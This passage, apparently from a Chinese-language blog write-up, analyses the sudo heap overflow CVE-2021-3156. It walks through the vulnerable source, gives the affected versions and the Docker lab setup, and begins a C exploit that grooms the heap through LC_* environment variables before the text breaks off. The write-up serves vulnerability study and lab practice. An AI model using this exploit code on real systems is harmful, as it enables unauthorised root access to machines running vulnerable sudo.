punctuation">(</span>sudo_mode <span class="token operator">&amp;</span> MODE_MASK<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    ··· ···    ··· ···    <span class="token keyword">case</span> MODE_EDIT<span class="token punctuation">:</span>    <span class="token keyword">case</span> MODE_RUN<span class="token punctuation">:</span>        ok <span class="token operator">=</span> <span class="token function">policy_check</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>policy_plugin<span class="token punctuation">,</span> nargc<span class="token punctuation">,</span> nargv<span class="token punctuation">,</span> env_add<span class="token punctuation">,</span>        <span class="token operator">&amp;</span>command_info<span class="token punctuation">,</span> <span class="token operator">&amp;</span>argv_out<span class="token punctuation">,</span> <span class="token operator">&amp;</span>user_env_out<span class="token punctuation">)</span><span class="token punctuation">;</span>        ··· ···        ··· ···    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>       ··· ···    ··· ···<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p><code>执行原理</code></p><ul><li><p>首先调用parse_args 函数处理我们输入的参数，其实这里我们就输入了一个<code>-s</code> 而已，将sudo_mode 设置成 MODE_EDIT 和 MODE_SHELL。</p></li><li><p>然后根据sudo_mode 不同，MODE_EDIT 回调用policy_check</p></li></ul><blockquote><p>2.sudo.c   policy_check函数</p></blockquote><p><code>sudo.c 中的policy_check函数(sudo.c: 1136)</code></p><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">policy_check</span><span class="token punctuation">(</span><span class="token keyword">struct</span> plugin_container <span class="token operator">*</span>plugin<span class="token punctuation">,</span> <span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token keyword">char</span> <span class="token operator">*</span>env_add<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>command_info<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv_out<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>user_env_out<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    ··· ···    ··· ···    ret <span class="token operator">=</span> plugin<span class="token operator">-></span>u<span class="token punctuation">.</span>policy<span class="token operator">-></span><span class="token function">check_policy</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> env_add<span class="token punctuation">,</span> command_info<span class="token punctuation">,</span>    argv_out<span class="token punctuation">,</span> user_env_out<span class="token punctuation">)</span><span class="token punctuation">;</span>    ···<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p><code>回调函数plugin-&gt;u.policy-&gt;check_policy ，可以调试查看这个函数的真实函数</code></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220609163235.png" alt="image-20220609163228205"></p><blockquote><p>3.policy.c sudoers_policy_check 函数</p></blockquote><p><code>policy.c 中的 sudoers_policy_check 函数(policy.c: 760)</code></p><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span><span class="token function">sudoers_policy_check</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>env_add<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>command_infop<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv_out<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>user_env_out<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    ··· ···    exec_args<span class="token punctuation">.</span>argv <span class="token operator">=</span> argv_out<span class="token punctuation">;</span>    exec_args<span class="token punctuation">.</span>envp <span class="token operator">=</span> user_env_out<span class="token punctuation">;</span>    exec_args<span class="token punctuation">.</span>info <span class="token operator">=</span> command_infop<span class="token punctuation">;</span>    ret <span class="token operator">=</span> <span class="token function">sudoers_policy_main</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> env_add<span class="token punctuation">,</span> <span class="token operator">&amp;</span>exec_args<span class="token punctuation">)</span><span class="token punctuation">;</span>    ··· ···    ··· ···<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><blockquote><p>4.sudoers.c sudoers_policy_main 函数</p></blockquote><p><code>sudoers.c 中的sudoers_policy_main 函数(sudoers.c: 224)</code></p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sudoers_policy_main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> pwflag<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>env_add<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token keyword">void</span> <span class="token operator">*</span>closure<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    ··· ···    ··· ···    <span class="token comment" spellcheck="true">/*     * Make a local copy of argc/argv, with special handling     * for pseudo-commands and the '-i' option.     */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    ··· ···    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Must leave an extra slot before NewArgv for bash's --login */</span>    NewArgc <span class="token operator">=</span> argc<span class="token punctuation">;</span>    NewArgv <span class="token operator">=</span> <span class="token function">reallocarray</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> NewArgc <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ··· ···    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">++</span>NewArgv<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> argc <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    NewArgv<span class="token punctuation">[</span>NewArgc<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    ··· ···    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    ··· ···    cmnd_status <span class="token operator">=</span> <span class="token function">set_cmnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ··· ···    ··· ···    ··· ···<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p><code>NewArgc 和 NewArgv 如下，其实就是传入参数</code></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220609163517.png" alt="image-20220609163517195"></p><blockquote><p>5.sudoers.c  set_cmnd 函数</p></blockquote><p><code>sudoers.c 中 set_cmnd 函数(sudoers.c: 796)</code></p><pre class=" language-c"><code class="language-c"><span class="token function">set_cmnd</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    ··· ···    ··· ···    <span class="token comment" spellcheck="true">/* set user_args */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>NewArgc <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> <span class="token operator">*</span>to<span class="token punctuation">,</span> <span class="token operator">*</span>from<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token operator">*</span>av<span class="token punctuation">;</span>        size_t size<span class="token punctuation">,</span> n<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* Alloc and build up user_args. */</span>        <span class="token comment" spellcheck="true">//根据参数总长度计算size， 后续malloc 申请，没有问题</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> av <span class="token operator">=</span> NewArgv <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">*</span>av<span class="token punctuation">;</span> av<span class="token operator">++</span><span class="token punctuation">)</span>        size <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">*</span>av<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>user_args <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">sudo_warnx</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"%s: %s"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">__func__</span><span class="token punctuation">,</span> <span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"unable to allocate memory"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">debug_return_int</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ISSET</span><span class="token punctuation">(</span>sudo_mode<span class="token punctuation">,</span> MODE_SHELL<span class="token operator">|</span>MODE_LOGIN_SHELL<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*         * When running a command via a shell, the sudo front-end         * escapes potential meta chars.  We unescape non-spaces         * for sudoers matching and logging purposes.         */</span>         <span class="token comment" spellcheck="true">//将所有参数拷贝到一起放到堆中，逻辑是遇到'\'加非空格类型字符则只拷贝非空格字符</span>         <span class="token comment" spellcheck="true">//但这里\x00 并不算空格类型字符</span>         <span class="token comment" spellcheck="true">//他没有考虑参数如果只有一个'\'或以'\'结尾并且下两个字符后就是另一个字符串情况</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>to <span class="token operator">=</span> user_args<span class="token punctuation">,</span> av <span class="token operator">=</span> NewArgv <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">(</span>from <span class="token operator">=</span> <span class="token operator">*</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span> av<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>from<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>from<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\\'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isspace</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span>from<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                from<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token operator">*</span>to<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>from<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>            <span class="token operator">*</span>to<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token operator">--</span>to <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>         ··· ···    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    ··· ···    ··· ···<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p><code>溢出也发生在这里，堆溢出发生在向堆中拷贝时，就是将NewArgv中的所有参数都拷贝到堆中，空格分割，遇到</code>+非空格类字符<code> 则只拷贝该字符</code></p><p>==某个NewArgv元素是以\ 结尾，那么就是+\x00 这种结构，而\x00 是不属于空格类字符的(离谱)，也就是说，它会将\x00 拷贝到堆中之后，from 变量再 ++ (一个循环中加了两次)直接过了while 判断结束标记\x00 的机会，而认为参数没有拷贝完而继续向后拷贝，直到遇到下一个\x00 为止==</p><p>在该场景下可以看到  +\x00 后面紧跟着就是下一个参数 A<em>80 所以会继续拷贝到A</em>80 的结尾。但别忘了接下来还会继续真正处理A<em>80 这个参数，还会再拷贝一遍，所以这里总共对A</em>80 进行了两次拷贝，但chunk 的申请时按照只有一个 A*80 字符串的大小申请的，远远超过了chunk 申请的长度<br><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220609164024.png" alt="image-20220609164024813"></p><p>然后造成溢出，拷贝前：</p><p><img src="https://img-blog.csdnimg.cn/c70c660e908640b0a3aeefaeecee980d.png#pic_center" alt="image-20220123114036691"></p><p>拷贝后：</p><p><img src="https://img-blog.csdnimg.cn/a1b1b99a31b54ecaa02fcfd42ce7f14e.png#pic_center" alt="image-20220123114137794"></p><p>漏洞原理路径</p><pre class=" language-c"><code class="language-c">sudo<span class="token punctuation">.</span>c <span class="token punctuation">:</span> main    sudo<span class="token punctuation">.</span>c <span class="token punctuation">:</span> policy_check        policy<span class="token punctuation">.</span>c <span class="token punctuation">:</span> sudoerrs_policy_check            sudoers<span class="token punctuation">.</span>c <span class="token punctuation">:</span> sudoers_policy_main                sudoers<span class="token punctuation">.</span>c <span class="token punctuation">:</span> set_cmnd                    sudoers<span class="token punctuation">.</span>c <span class="token punctuation">:</span> <span class="token number">859</span></code></pre><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><code>受影响版本：  Sudo 1.8.2 – 1.8.31p2  Sudo 1.9.0 – 1.9.5p1</code></p><h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h3 id="靶场一"><a href="#靶场一" class="headerlink" title="靶场一"></a>靶场一</h3><blockquote><p>1.docker 拉取镜像</p></blockquote><p><code>docker pull chenaotian/cve-2021-3156</code></p><pre class=" language-bash"><code class="language-bash">root@ubuntu:~<span class="token comment" spellcheck="true"># docker pull chenaotian/cve-2021-3156</span>Using default tag: latestlatest: Pulling from chenaotian/cve-2021-31562f94e549220a: Pull complete e4906a24f34d: Pull complete 75904513a41e: Pull complete Digest: sha256:fd71e15a0324c86bd7a8bcff35f5f76c45853fac03e4dc9f0a8e88f7aa6d6758Status: Downloaded newer image <span class="token keyword">for</span> chenaotian/cve-2021-3156:latestdocker.io/chenaotian/cve-2021-3156:latest</code></pre><blockquote><p>2.启动镜像</p></blockquote><p><code>docker run -d -ti --rm -h sudodebug --name sudodebug --cap-add=SYS_PTRACE chenaotian/cve-2021-3156:latest /bin/bash</code></p><p><code>docker exec -it sudodebug  /bin/bash</code></p><pre class=" language-bash"><code class="language-bash">root@ubuntu:~<span class="token comment" spellcheck="true"># docker run -d -ti --rm -h sudodebug --name sudodebug --cap-add=SYS_PTRACE chenaotian/cve-2021-3156:latest /bin/bash</span>93dc8991158b530c0db4ef914e0690f14c030f0ca6d16019b7143c5c4fea02acroot@ubuntu:~<span class="token comment" spellcheck="true"># </span>root@ubuntu:~<span class="token comment" spellcheck="true"># docker exec -it sudodebug  /bin/bash</span>root@sudodebug:/<span class="token comment" spellcheck="true"># cd</span>root@sudodebug:~<span class="token comment" spellcheck="true"># ls</span>Pwngdb-master  exp  glibc-2.27  pwndbg-dev  sudo-1.8.21root@sudodebug:~<span class="token comment" spellcheck="true"># </span></code></pre><p>参考链接：<a href="https://hub.docker.com/r/chenaotian/cve-2021-3156">https://hub.docker.com/r/chenaotian/cve-2021-3156</a></p><blockquote><p>3.判断是否存在漏洞 sudoedit -s / 和sudo -V</p></blockquote><pre class=" language-bash"><code class="language-bash">root@sudodebug:~<span class="token comment" spellcheck="true"># sudoedit -s /</span>sudoedit: /: not a regular <span class="token function">file</span>root@sudodebug:~<span class="token comment" spellcheck="true"># sudo -V   </span>Sudo version 1.8.21</code></pre><h4 id="EXP构建"><a href="#EXP构建" class="headerlink" title="EXP构建"></a>EXP构建</h4><blockquote><p>1.exp.c文件</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;math.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_CTYPE               0</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_NUMERIC             1</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_TIME                2</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_COLLATE             3</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_MONETARY            4</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_MESSAGES            5</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_ALL                 6</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_PAPER               7</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_NAME                8</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_ADDRESS             9</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_TELEPHONE          10</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_MEASUREMENT        11</span><span class="token macro property">#<span class="token directive keyword">define</span> __LC_IDENTIFICATION     12</span><span class="token keyword">char</span> <span class="token operator">*</span> envName<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token string">"LC_CTYPE"</span><span class="token punctuation">,</span><span class="token string">"LC_NUMERIC"</span><span class="token punctuation">,</span><span class="token string">"LC_TIME"</span><span class="token punctuation">,</span><span class="token string">"LC_COLLATE"</span><span class="token punctuation">,</span><span class="token string">"LC_MONETARY"</span><span class="token punctuation">,</span><span class="token string">"LC_MESSAGES"</span><span class="token punctuation">,</span><span class="token string">"LC_ALL"</span><span class="token punctuation">,</span><span class="token string">"LC_PAPER"</span><span class="token punctuation">,</span><span class="token string">"LC_NAME"</span><span class="token punctuation">,</span><span class="token string">"LC_ADDRESS"</span><span class="token punctuation">,</span>"LC_TELEPHONE<span class="token string">","</span>LC_MEASUREMENT<span class="token string">","</span>LC_IDENTIFICATION"<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token keyword">int</span> now<span class="token operator">=</span><span class="token number">13</span><span class="token punctuation">;</span><span class="token keyword">int</span> envnow<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> argvnow<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token number">0x300</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token number">0x300</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span> <span class="token function">addChunk</span><span class="token punctuation">(</span><span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    now <span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span> result<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>now <span class="token operator">==</span><span class="token number">6</span><span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        now <span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>now<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        result<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span>envName<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">strcat</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span><span class="token string">"=C.UTF-8@"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">9</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>size<span class="token number">-0x17</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token function">strcat</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        envp<span class="token punctuation">[</span>envnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>result<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">final</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    now <span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span> result<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>now <span class="token operator">==</span><span class="token number">6</span><span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        now <span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>now<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        result<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span>envName<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">strcat</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span><span class="token string">"=xxxxxxxxxxxxxxxxxxxxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        envp<span class="token punctuation">[</span>envnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>result<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">setargv</span><span class="token punctuation">(</span><span class="token keyword">int</span> size<span class="token punctuation">,</span><span class="token keyword">int</span> offset<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    size<span class="token operator">-</span><span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">;</span>    <span class="token keyword">signed</span> <span class="token keyword">int</span> x<span class="token punctuation">,</span>y<span class="token punctuation">;</span>    <span class="token keyword">signed</span> <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">signed</span> <span class="token keyword">int</span> b<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>size<span class="token number">-3</span><span class="token punctuation">;</span>    <span class="token keyword">signed</span> <span class="token keyword">int</span> c<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>size<span class="token number">-2</span><span class="token operator">-</span>offset<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">signed</span> <span class="token keyword">int</span> tmp<span class="token operator">=</span>b<span class="token operator">*</span>b<span class="token number">-4</span><span class="token operator">*</span>a<span class="token operator">*</span>c<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>tmp<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    tmp<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>tmp<span class="token operator">*</span><span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">signed</span> <span class="token keyword">int</span> A<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">-</span>b<span class="token operator">+</span>tmp<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">signed</span> <span class="token keyword">int</span> B<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">-</span>b<span class="token operator">-</span>tmp<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>A<span class="token operator">&lt;</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> B<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>A<span class="token operator">></span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> B<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>A<span class="token operator">&lt;</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> B<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        x<span class="token operator">=</span><span class="token punctuation">(</span>A<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">?</span> A<span class="token punctuation">:</span> B<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>A<span class="token operator">></span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> B <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        x<span class="token operator">=</span><span class="token punctuation">(</span>A<span class="token operator">&lt;</span>B<span class="token punctuation">)</span> <span class="token operator">?</span> A <span class="token punctuation">:</span> B<span class="token punctuation">;</span>    y<span class="token operator">=</span>size<span class="token number">-1</span><span class="token operator">-</span>x<span class="token operator">*</span><span class="token number">2</span><span class="token 